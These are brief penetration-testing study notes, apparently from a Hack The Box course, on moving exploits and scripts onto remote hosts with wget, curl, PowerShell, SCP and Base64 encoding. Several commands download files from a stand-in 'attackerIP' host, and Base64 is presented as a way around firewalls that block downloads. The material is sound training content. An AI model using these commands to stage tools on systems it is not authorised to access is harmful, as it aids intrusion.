# Transferring Files Summary

Transfer files/scripts/exploits to/from remote hosts. Methods: HTTP server, SCP, Base64. Validate integrity.

## Using wget

- Start Python server: `cd /dir; python3 -m http.server 8000`
- Download: `wget http://attackerIP:8000/file`
- Alt: `curl http://attackerIP:8000/file -o file`

**Additional**: For Windows: `Invoke-WebRequest -Uri http://attackerIP/file -OutFile file.ps1`

## Using SCP

- Requires SSH creds.
- Upload: `scp localfile user@remote:/path/`
- Download: `scp user@remote:/path/file ./`

**Additional**: SFTP: `sftp user@remote` then `get/put`.

## Using Base64

- For firewalls blocking downloads.
- Encode: `base64 file -w 0` (one line).
- Decode on remote: `echo "base64string" | base64 -d > file`

**Additional**: PowerShell: `[Convert]::ToBase64String([IO.File]::ReadAllBytes("file"))` encode; `[IO.File]::WriteAllBytes("file", [Convert]::FromBase64String("string"))` decode.

## Validating File Transfers

- Check type: `file file` (e.g., ELF executable).
- Verify integrity: `md5sum file` (compare hashes).

**Additional**: sha256sum, diff. For binaries: Run/test if possible.

**General Tips**: Use HTTP for simple; SCP for secure; Base64 for restricted. Module: File Transfers for more. Practice on HTB. Ensure perms (e.g., chmod +x script). For large files: Compress first.
